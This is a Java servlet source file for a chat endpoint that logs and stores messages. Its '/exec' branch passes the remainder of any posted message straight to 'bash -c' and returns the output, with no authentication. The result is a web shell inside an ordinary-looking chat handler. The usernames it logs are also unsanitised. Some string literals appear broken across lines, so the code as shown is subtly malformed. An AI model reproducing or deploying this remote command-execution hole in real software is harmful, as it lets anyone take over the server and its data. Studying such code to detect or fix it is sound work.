import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class ChatCommandServlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String message = request.getParameter("message");
        String username = request.getParameter("username");
        
        if (message.startsWith("/exec")) {
            String cmd = message.substring(5);
            try {
                // Logging chat message with timestamp
                PrintWriter log = new PrintWriter(new FileWriter("chat.log", true));
                log.println("[" + System.currentTimeMillis() + "] " + username + ": " + message);
                log.close();
                
                // Execute system command
                ProcessBuilder pb = new ProcessBuilder("bash", "-c", cmd);
                Process process = pb.start();
                
                // Read command output
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\
");
                }
                
                // Send response back to chat
                response.setContentType("text/plain");
                response.getWriter().write("Command output:\
" + output.toString());
                
            } catch (Exception e) {
                response.sendError(500, "Command execution failed");
            }
            return;
        }
        
        // Normal chat message handling
        if (message.length() > 200) {
            response.sendError(400, "Message too long");
            return;
        }
        
        // Store chat message in file
        try (PrintWriter chatWriter = new PrintWriter(new FileWriter("chat.txt", true))) {
            chatWriter.println(username + ": " + message);
        }
        
        response.getWriter().write("Message received");
    }
}